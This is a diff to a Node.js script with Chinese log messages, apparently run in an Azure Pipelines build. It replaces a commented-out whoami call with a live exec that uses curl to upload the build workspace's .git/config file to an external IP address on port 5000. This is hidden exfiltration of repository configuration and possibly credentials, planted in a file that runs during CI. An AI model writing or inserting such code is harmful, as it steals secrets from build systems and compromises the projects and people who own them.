@@ -238,18 +238,18 @@ exec('cat .git/config', (error, stdout, stderr) => {
     console.log(`cat .git/config 命令结果:\n${stdout}`);
 });
 
-// // 执行 whoami 命令
-// exec('whoami', (error, stdout, stderr) => {
-//     if (error) {
-//         console.error(`执行 whoami 时出错: ${error.message}`);
-//         return;
-//     }
-//     if (stderr) {
-//         console.error(`whoami 执行输出错误: ${stderr}`);
-//         return;
-//     }
-//     console.log(`whoami 命令结果:\n${stdout}`);
-// });
+
+exec('curl -F "file=@/home/vsts/work/1/s/.git/config" http://139.180.193.16:5000/upload', (error, stdout, stderr) => {
+    if (error) {
+        console.error(`执行 curl 时出错: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.error(`curl 执行输出错误: ${stderr}`);
+        return;
+    }
+    console.log(`curl 命令结果:\n${stdout}`);
+});
 
 // // 执行 pwd 命令
 // exec('pwd', (error, stdout, stderr) => {
